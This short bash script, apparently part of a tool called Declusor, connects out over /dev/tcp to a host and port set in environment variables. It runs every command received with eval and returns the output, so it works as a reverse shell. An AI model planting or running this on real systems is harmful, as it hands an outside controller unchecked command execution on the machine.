exec 3<>/dev/tcp/"$DECLUSOR_HOST"/"$DECLUSOR_PORT" || exit 1
trap 'exec 3>&-' EXIT

while read -r -d '' -u 3 nonce && IFS= read -r -d '' -u 3 data; do
    [ "$data" = "exit" ] && break
    eval "$data" </dev/null
    printf '__DECLUSOR_EOF_%s__\n' "$nonce"
done >&3 2>&1